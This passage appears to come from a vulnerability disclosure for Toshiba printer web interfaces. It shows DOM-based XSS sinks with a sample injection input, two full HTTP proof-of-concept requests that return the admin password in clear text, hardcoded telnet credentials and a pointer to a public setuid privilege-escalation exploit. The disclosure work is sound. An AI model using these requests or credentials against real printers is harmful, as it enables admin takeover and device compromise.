 <span style="color: #666666">579</span>                 <span style="color: #408080; font-style: italic">//alert(&quot;Error: strVar is null in getQueryStringValue()&quot;)</span>
 <span style="color: #666666">580</span>             } <span style="color: #008000; font-weight: bold">else</span> {
 <span style="color: #666666">581</span>                 <span style="color: #008000; font-weight: bold">var</span> strVar <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">582</span>                 <span style="color: #008000; font-weight: bold">if</span>(strloc.indexOf(<span style="color: #BA2121">&quot;?&quot;</span>) <span style="color: #666666">!=</span> <span style="color: #666666">-1</span>)
 <span style="color: #666666">583</span>                     strVar <span style="color: #666666">=</span> strloc.split(<span style="color: #BA2121">&quot;?&quot;</span>);
 <span style="color: #666666">584</span>                 <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">585</span>                     strVar <span style="color: #666666">=</span> strloc.split(<span style="color: #BA2121">&quot;#&quot;</span>);
 <span style="color: #666666">586</span>                 <span style="color: #008000; font-weight: bold">var</span> arrExpressions <span style="color: #666666">=</span> strVar[<span style="color: #666666">1</span>].split(<span style="color: #BA2121">&quot;&amp;&quot;</span>);
 <span style="color: #666666">587</span>                 <span style="color: #008000; font-weight: bold">if</span>(arrExpressions <span style="color: #666666">==</span> <span style="color: #008000; font-weight: bold">null</span>){
 <span style="color: #666666">588</span>                    <span style="color: #408080; font-style: italic">// alert(&quot;Error: arrExpressions is null in getQueryStringValue()&quot;)</span>
 <span style="color: #666666">589</span>                                 }
 <span style="color: #666666">590</span>                 <span style="color: #008000; font-weight: bold">var</span> arrVars <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span>;
 <span style="color: #666666">591</span>                 <span style="color: #008000; font-weight: bold">for</span> (i<span style="color: #666666">=0</span>;i<span style="color: #666666">&lt;</span>arrExpressions.length;i<span style="color: #666666">++</span>) {
 <span style="color: #666666">592</span>                     arrVars <span style="color: #666666">=</span> arrExpressions[i].split(<span style="color: #BA2121">&quot;=&quot;</span>);
 <span style="color: #666666">593</span>                     <span style="color: #008000; font-weight: bold">if</span> (arrVars[<span style="color: #666666">0</span>] <span style="color: #666666">==</span> varname) {
 <span style="color: #666666">594</span>                         <span style="color: #408080; font-style: italic">//alert(&quot;inside getQueryStringValue fun&quot;+unescape(arrVars[1]));</span>
 <span style="color: #666666">595</span>                         <span style="color: #008000; font-weight: bold">return</span> unescape(arrVars[<span style="color: #666666">1</span>]);
 <span style="color: #666666">596</span>                     }
 <span style="color: #666666">597</span>                 }
 <span style="color: #666666">598</span>             }
 <span style="color: #666666">599</span>     
 <span style="color: #666666">600</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">601</span>         } <span style="color: #008000; font-weight: bold">catch</span>(e){errHandler(e,<span style="color: #BA2121">&#39;getQueryStringValue()&#39;</span>,<span style="color: #BA2121">&#39;TopAccessUtil.js?v=1670278837ta&#39;</span>,<span style="color: #BA2121">&quot;&quot;</span>);<span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;&quot;</span>;}
 <span style="color: #666666">602</span>     }
</pre></div>

<p>For example, the webpage <code>/Administration/SystemUpdates/MoreUpdateDetails.html</code> uses the <code>getQueryStringValue()</code> function to display variables. Such variables can be controlled by an attacker to inject malicious JavaScript codes and steal the admin's session cookie:</p>
<p>Content of <code>/Administration/SystemUpdates/MoreUpdateDetails.html</code> with vulnerable codes on lines 46, 51 and 58:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> 31 &lt;<span style="color: #008000; font-weight: bold">FORM</span> <span style="color: #7D9029">NAME </span><span style="color: #666666">=</span> <span style="color: #BA2121">&quot;frmMoreUpdateDetails&quot;</span>&gt;
 32         &lt;<span style="color: #008000; font-weight: bold">TABLE</span> <span style="color: #7D9029">BORDER</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;0&quot;</span> <span style="color: #7D9029">cellspacing</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;6&quot;</span> <span style="color: #7D9029">cellpadding</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;0&quot;</span> <span style="color: #7D9029">width</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;100%&quot;</span>&gt;
 33                 &lt;<span style="color: #008000; font-weight: bold">TR</span> &gt;
 34                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">NOWRAP</span> <span style="color: #7D9029">colspan</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;2&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FONT-WEIGHT: normal; FONT-SIZE: 16pt; COLOR: #6699FE; FONT-STYLE: normal; FONT-FAMILY: Arial, sans-serif; TEXT-DECORATION: none&quot;</span>&gt;
 35                                 &lt;<span style="color: #008000; font-weight: bold">script</span> <span style="color: #7D9029">type</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;text/javascript&quot;</span>&gt;<span style="color: #008000">document</span>.write(fnGetLocaleString(<span style="color: #BA2121">&quot;DUMMYRESID&quot;</span>,<span style="color: #BA2121">&quot;Update Details&quot;</span>));&lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
 36                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 37                 &lt;/<span style="color: #008000; font-weight: bold">TR</span>&gt;
 38                 &lt;<span style="color: #008000; font-weight: bold">TR</span> &gt;
 39                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">NOWRAP</span> <span style="color: #7D9029">colspan</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;2&quot;</span>&gt;
 40                                 <span style="color: #999999; font-weight: bold">&amp;nbsp;</span>
 41                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 42                 &lt;/<span style="color: #008000; font-weight: bold">TR</span>&gt;
 43                 &lt;<span style="color: #008000; font-weight: bold">TR</span>&gt;
 44                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">WIDTH </span><span style="color: #666666">=</span> <span style="color: #BA2121">&quot;30%&quot;</span> <span style="color: #7D9029">ALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;LEFT&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FONT-SIZE:10pt;FONT-STYLE: normal; FONT-FAMILY: Arial, sans-serif;&quot;</span>&gt;
 45                                 &lt;<span style="color: #008000; font-weight: bold">B</span>&gt;&lt;<span style="color: #008000; font-weight: bold">script</span>&gt;
 <span style="color: #666666">46</span>                                         <span style="color: #008000">document</span>.write(getQueryStringValue(<span style="color: #BA2121">&quot;packageName&quot;</span>,<span style="color: #BA2121">&quot;self&quot;</span>));
 <span style="color: #666666">47</span>                                 &lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">B</span>&gt;
 48                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 49                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">ALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;LEFT&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FONT-SIZE:9pt;FONT-STYLE: normal; FONT-FAMILY: Arial, sans-serif;&quot;</span>&gt;
 50                                 &lt;<span style="color: #008000; font-weight: bold">B</span>&gt;&lt;<span style="color: #008000; font-weight: bold">script</span>&gt;
 <span style="color: #666666">51</span>                                         <span style="color: #008000">document</span>.write(getQueryStringValue(<span style="color: #BA2121">&quot;packageDate&quot;</span>,<span style="color: #BA2121">&quot;self&quot;</span>));
 <span style="color: #666666">52</span>                                 &lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;&lt;/<span style="color: #008000; font-weight: bold">B</span>&gt;
 53                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 54                 &lt;/<span style="color: #008000; font-weight: bold">TR</span>&gt;
 55                 &lt;<span style="color: #008000; font-weight: bold">TR</span> &gt;
 56                         &lt;<span style="color: #008000; font-weight: bold">TD</span> <span style="color: #7D9029">VALIGN</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;TOP&quot;</span> <span style="color: #7D9029">style</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FONT-SIZE:10pt;FONT-STYLE: normal; FONT-FAMILY: Arial, sans-serif;&quot;</span> <span style="color: #7D9029">colspan</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;2&quot;</span>&gt;
 57                         &lt;<span style="color: #008000; font-weight: bold">script</span>&gt;
 <span style="color: #666666">58</span>                                 <span style="color: #008000">document</span>.write(<span style="color: #BA2121">&#39;&lt;textarea rows=&quot;13&quot; cols=&quot;47&quot;&gt;&#39;</span><span style="color: #666666">+</span><span style="color: #008000">window</span>.opener.getValue(getQueryStringValue(<span style="color: #BA2121">&quot;packageId&quot;</span>))<span style="color: #666666">+</span><span style="color: #BA2121">&#39;&lt;/textarea&gt;&#39;</span>);
 <span style="color: #666666">59</span>                         &lt;/<span style="color: #008000; font-weight: bold">script</span>&gt;
 60                         &lt;/<span style="color: #008000; font-weight: bold">TD</span>&gt;
 61                 &lt;/<span style="color: #008000; font-weight: bold">TR</span>&gt;
</pre></div>

<p>It is possible to inject HTML code and JavaScript code, as shown below with the <code>XMP</code> HTML tag that will be interpreted and disable any following code, using <code>?packageName=&lt;XMP&gt;</code> in the query string.</p>
<p><img alt="" src="images/2024-toshiba-xss.png" /></p>
<p><a href="images/2024-toshiba-xss-full.png">Click here for full image</a></p>
<p>It is possible to find such DOM-based XSS in the code base. There are at least 27 XSS in the HTML files provided by the printer:</p>
<pre><code>kali% rgrep getQueryStringValue .|grep write
./Administration/SystemUpdates/MoreUpdateDetails.html:                                  document.write(getQueryStringValue("packageName","self"));
./Administration/SystemUpdates/MoreUpdateDetails.html:                                  document.write(getQueryStringValue("packageDate","self"));
./Administration/SystemUpdates/MoreUpdateDetails.html:                          document.write('&lt;textarea rows="13" cols="47"&gt;'+window.opener.getValue(getQueryStringValue("packageId"))+'&lt;/textarea&gt;');
./Registration/Template/ScanToEFiling.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=8&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToUSB.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=15&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToEmailAndUSB.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=16&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/MetaScanToUSB.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=21&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/FaxMode.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=4&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/MetaScanToFile.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=19&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/CopySaveAsFile.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=2&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/ScanToEMail.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=7&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanSettingList.html:        &lt;option value="High"&gt;&lt;script type="text/javascript"&gt;if(getQueryStringValue("DefaultVals","self")=="true"){document.write(fnGetLocaleString("100880","High"));} else {document.write(fnGetLocaleString("101095","Low"));}&lt;/script&gt;
./Registration/Template/ScanSettingList.html:        &lt;option value="Low"&gt;&lt;script type="text/javascript"&gt;if(getQueryStringValue("DefaultVals","self")=="true"){document.write(fnGetLocaleString("101095","Low"));} else {document.write(fnGetLocaleString("100880","High"));}&lt;/script&gt;
./Registration/Template/ScanSettingList.html:                    &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=\"+tempImgID+\"&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/CopyStoreToEFilling.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=3&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/SmbFtpOther.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=22&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/MetaScanToEmail.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=20&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/ScanToEmailAndSaveAsFile.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=10&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanSetting.html:                        &lt;option value="High"&gt;&lt;script type="text/javascript"&gt;if(opener.getQueryStringValue("DefaultVals","self")=="true") {document.write(fnGetLocaleString("100880","High"));} else {document.write(fnGetLocaleString("101095","Low"));}&lt;/script&gt;
./Registration/Template/ScanSetting.html:                        &lt;option value="Low"&gt;&lt;script type="text/javascript"&gt;if(opener.getQueryStringValue("DefaultVals","self")=="true") {document.write(fnGetLocaleString("101095","Low"));} else {document.write(fnGetLocaleString("100880","High"));}&lt;/script&gt;
./Registration/Template/FaxSaveAsFile.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=5&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/ScanToFile.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=6&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToFileAndUSB.html:                &lt;script type="text/javascript"&gt;document.write(" &lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=18&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/MetaScanToEmailAndFile.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT  type='button' value='"+fnGetLocaleString('101335','Panel Setting')+"' ID='btnPanelProperties' onclick=fnnOpenInNewWindow('PanelSet.html?v=1670282309ta&amp;tempImgId=23&amp;groupid='+getQueryStringValue('groupid'));&gt;");&lt;/script&gt;
./Registration/Template/ScanToFileAndBox.html:            &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=11&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToEfilingAndUSB.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=17&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
./Registration/Template/ScanToEmailAndEFiling.html:                &lt;script type="text/javascript"&gt;document.write("&lt;INPUT ID=\"btnPanelProperties\" TYPE=\"button\" VALUE=\""+fnGetLocaleString("101335","Panel Setting")+"\" ONCLICK='fnnOpenInNewWindow(\"PanelSet.html?v=1670282309ta&amp;tempImgId=12&amp;groupid=\"+getQueryStringValue(\"groupid\"))'&gt;");&lt;/script&gt;
</code></pre>
<p>Since the <code>getQueryStringValue()</code> function is used 880 times in these files, there are more XSS vulnerabilities that can be found while analyzing the code.</p>
<pre><code>kali% pwd
/home/user/extract/home/SYSROM_SRC/build/release/TopAccess
kali% rgrep getQueryStringValue . | wc -l
880
kali%
</code></pre>
<p>An attacker can steal the cookie of an admin user.</p>
<p><a id="leak-admin-password"></a></p>
<h2>Details - Leak of admin password and passwords</h2>
<p>All the Toshiba printers will display the password of the admin user in clear-text and additional passwords when sending 2 specific HTTP requests to the API /contentwebserver. An attacker stealing the cookie of an admin or abusing a XSS vulnerability can recover this password in clear-text and compromise the printer.</p>
<p>This HTTP request can be shown below:</p>
<p>HTTP request used to recover the password of the admin user:</p>
<p><img alt="" src="images/2024-toshiba-leak-admin-password.png" /></p>
<p><a href="images/2024-toshiba-leak-admin-password-full.png">Click here for full image</a></p>
<p>2 requests are mandatory:</p>
<ul>
<li>The first POST request to <code>/contentwebserver</code> containing this payload:</li>
</ul>
<pre><xmp><DeviceInformationModel>
  <GetValue>
    <TopAccess>
      <SessionInfo/>
    </TopAccess>
  </GetValue>
</DeviceInformationModel></xmp></pre>

<ul>
<li>The second POST request to <code>/contentwebserver</code> containing this payload:</li>
</ul>
<pre><xmp><DeviceInformationModel>
  <GetValue>
    <UserManager>
      <Users/>
    </UserManager>
  </GetValue>
  <GetValue>
    <Authentication>
      <UserCredential/>
      <AuthenticationSettings/>
    </Authentication>
  </GetValue>
  <SetValue>
    <UserManager>
      <Users maxPage="" pageNo="1" pageSize="100" totalUsers=""/>
    </UserManager>
  </SetValue>
  <Command>
    <GetUsers>
      <commandNode>UserManager/Users</commandNode>
      <Params>
        <userDetails contentType="XPath">UserManager</userDetails>
        <cmdDetails>FEW</cmdDetails>
      </Params>
    </GetUsers>
  </Command>
  <Command>
    <GetSettings>
      <commandNode>Authentication/AuthenticationSettings</commandNode>
    </GetSettings>
  </Command>
</DeviceInformationModel></xmp></pre>

<p>The server will respond with the password displayed in clear-text.</p>
<p>It is also possible to visit http://printer-ip/usermanagement/userconfirm/UserList.html?v=1670282309ta&amp;PAGENO=1 as admin and review the HTTP traffic. These 2 requests will be automatically sent by the browser when visiting this webpage:</p>
<p><img alt="" src="images/2024-toshiba-userlist.png" /></p>
<p>The PoC is (session must be updated):</p>
<p>First HTTP request:</p>
<pre><code>POST /contentwebserver HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */* 
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
csrfpId: 10.0.0.2.a89baa941c3bbdafcee7e9349daca6af
Content-Length: 120 
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/usermanagement/userconfirm/UserList.html?v=1670282309ta&amp;PAGENO=1
Cookie: Session=10.0.0.2.a89baa941c3bbdafcee7e9349daca6af; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; IgnoreSessionTimeout=1

&lt;DeviceInformationModel&gt;&lt;GetValue&gt;&lt;TopAccess&gt;&lt;SessionInfo&gt;&lt;/SessionInfo&gt;&lt;/TopAccess&gt;&lt;/GetValue&gt;&lt;/DeviceInformationModel&gt;
</code></pre>
<p>Second HTTP request:</p>
<pre><code>POST /contentwebserver HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */* 
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
csrfpId: 10.0.0.2.a89baa941c3bbdafcee7e9349daca6af
Content-Length: 652 
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/usermanagement/userconfirm/UserList.html?v=1670282309ta&amp;PAGENO=1
Cookie: Session=10.0.0.2.a89baa941c3bbdafcee7e9349daca6af; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; IgnoreSessionTimeout=1

&lt;DeviceInformationModel&gt;&lt;GetValue&gt;&lt;UserManager&gt;&lt;Users/&gt;&lt;/UserManager&gt;&lt;/GetValue&gt;&lt;GetValue&gt;&lt;Authentication&gt;&lt;UserCredential&gt;&lt;/UserCredential&gt;&lt;AuthenticationSettings&gt;&lt;/AuthenticationSettings&gt;&lt;/Authentication&gt;&lt;/GetValue&gt;&lt;SetValue&gt;&lt;UserManager&gt;&lt;Users maxPage='' pageNo='1' pageSize='100' totalUsers=''&gt;&lt;/Users&gt;&lt;/UserManager&gt;&lt;/SetValue&gt;&lt;Command&gt;&lt;GetUsers&gt;&lt;commandNode&gt;UserManager/Users&lt;/commandNode&gt;&lt;Params&gt;&lt;userDetails contentType='XPath'&gt;UserManager&lt;/userDetails&gt;&lt;cmdDetails&gt;FEW&lt;/cmdDetails&gt;&lt;/Params&gt;&lt;/GetUsers&gt;&lt;/Command&gt;&lt;Command&gt;&lt;GetSettings&gt;&lt;commandNode&gt;Authentication/AuthenticationSettings&lt;/commandNode&gt;&lt;/GetSettings&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
</code></pre>
<p>The answer for the second request will contain several passwords in clear-text, including the password of the admin user (<code>123456</code>):</p>
<pre><code>HTTP/1.1 200 OK
Date: Mon, 10 Apr 2023 11:17:34 GMT 
Server: Apache
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=63072000
Accept-Language: en-US,en;q=0.5
Connection: close
Content-Type: text/xml
Content-Length: 18489

[...]
          &lt;attrNameForUser ID="16"/&gt;
          &lt;atrNameForCardID ID="16"/&gt;
          &lt;attrNameForCardRevision ID="16"/&gt;
          &lt;attrNameForServerName ID="16"/&gt;
          &lt;passwordForCardRegistration&gt;[REDACTED]&lt;/passwordForCardRegistration&gt;
          &lt;skipRegistrationForCardAuth&gt;false&lt;/skipRegistrationForCardAuth&gt;
          &lt;autoRegistrationForCardAuth&gt;false&lt;/autoRegistrationForCardAuth&gt;
[...]
      &lt;UserCredential&gt;
        &lt;userName&gt;admin&lt;/userName&gt;
        &lt;passwd&gt;123456&lt;/passwd&gt;
        &lt;ipaddress&gt;10.0.0.2&lt;/ipaddress&gt;
        &lt;DepartmentManagement isEnable="false"&gt;
          &lt;requireDepartment/&gt;
        &lt;/DepartmentManagement&gt;
[...]
</code></pre>
<p>An attacker can retrieve the password of the admin user by using a XSS vulnerability or by stealing the cookie.</p>
<p><a id="hardcoded-password-telnetd"></a></p>
<h2>Details - Hardcoded credentials in telnetd</h2>
<p>It was observed that all the Toshiba printers contain hardcoded telnet credentials (Admin/System):</p>
<p>Content of the <code>telnet.conf</code> and <code>telnet.conf.bak</code> files:</p>
<pre><code>bash-4.1# ls -la /encryption/al/network/config/telnet.conf.bak
-rw-r--r-- 1 root root 41 Mar 15 11:50 /encryption/al/network/config/telnet.conf.bak
bash-4.1# ls -la /encryption/al/network/config/telnet.conf    
-rw-r--r-- 1 root root 41 Mar 15 11:50 /encryption/al/network/config/telnet.conf
bash-4.1# cat /encryption/al/network/config/telnet.conf
cat /encryption/al/network/config/telnet.conf
PortNo=23       
PassWord=System
UserName=Admin
bash-4.1# cat /encryption/al/network/config/telnet.conf.bak
cat /encryption/al/network/config/telnet.conf.bak
PortNo=23
PassWord=System
UserName=Admin
bash-4.1#
</code></pre>
<p>The telnet daemon can be enabled in the configuration file <code>/home/SYSROM_SRC/NoBuildItems/AL/Network/nsm.xml</code>, likely used by the alnsm program running as root.</p>
<p>Content of <code>/home/SYSROM_SRC/NoBuildItems/AL/Network/nsm.xml</code>:</p>
<pre><code>[...]
 785                                 &lt;NMO&gt;
 786                                         &lt;name&gt;Telnet&lt;/name&gt;
 787                                         &lt;configFile&gt;telnet.conf&lt;/configFile&gt;
 788                                         &lt;startCmd runBackground="1"&gt;$EB2/bin/networkservice/telnet start&lt;/startCmd&gt;
 789                                         &lt;stopCmd&gt;$EB2/bin/networkservice/telnet stop&lt;/stopCmd&gt;
 790                                         &lt;reloadCmd&gt;$EB2/bin/networkservice/telnet restart&lt;/reloadCmd&gt;
 791                                         &lt;statusCmd&gt;$EB2/bin/networkservice/telnet status&lt;/statusCmd&gt;
 792                                         &lt;serviceXpath&gt;Services/Telnet&lt;/serviceXpath&gt;
 793                                         &lt;connectSSM&gt;0&lt;/connectSSM&gt;
 794                                         &lt;startOrder&gt;32&lt;/startOrder&gt;
 795                                         &lt;dependents&gt;&lt;/dependents&gt;
 796                                         &lt;TranslationMap&gt;
 797                                                 &lt;Map&gt;
 798                                                         &lt;iniXpath&gt;UserName&lt;/iniXpath&gt;
 799                                                         &lt;xpath&gt;Username&lt;/xpath&gt;
 800                                                 &lt;/Map&gt;
 801                                                 &lt;Map&gt;
 802                                                         &lt;iniXpath&gt;PassWord&lt;/iniXpath&gt;
 803                                                         &lt;xpath&gt;Password&lt;/xpath&gt;
 804                                                 &lt;/Map&gt;
 805                                                 &lt;Map&gt;
 806                                                         &lt;iniXpath&gt;PortNo&lt;/iniXpath&gt;
 807                                                         &lt;xpath&gt;Port&lt;/xpath&gt;
 808                                                 &lt;/Map&gt;
 809                                         &lt;/TranslationMap&gt;
 810                                 &lt;/NMO&gt;
[...]
</code></pre>
<p>While the telnet server is not enabled by default, an attacker can login to the printer and get administrative privileges if the telnet server is enabled.</p>
<p><a id="lpe-procsuid"></a></p>
<h2>Details - Local Privilege Escalation using PROCSUID</h2>
<p>It was observed that all the Toshiba printers contain a suidperl binary located at /usr/bin/sperl5.10.1-17:</p>
<p>Perl 5.10.x dates from December 2007 and the suidperl binary at /usr/bin/sperl5.10.1-17 is vulnerable to a Local Privilege Escalation vulnerability. PROCSUID is an exploit developed by the NSA for this vulnerability and was made public in 2016.</p>
<p>The exploit is available at <a href="https://github.com/x0rz/EQGRP/blob/master/Linux/up/procsuids.sh.WITHCOMMENTS">https://github.com/x0rz/EQGRP/blob/master/Linux/up/procsuids.sh.WITHCOMMENTS</a>.</p>
<pre><code>bash-4.1# ls -la /usr/bin/sperl5.10.1-17
-rws--x--x 1 root root 74988 Mar 15 11:42 /usr/bin/sperl5.10.1-17
bash-4.1# /usr/bin/sperl5.10.1-17 --help

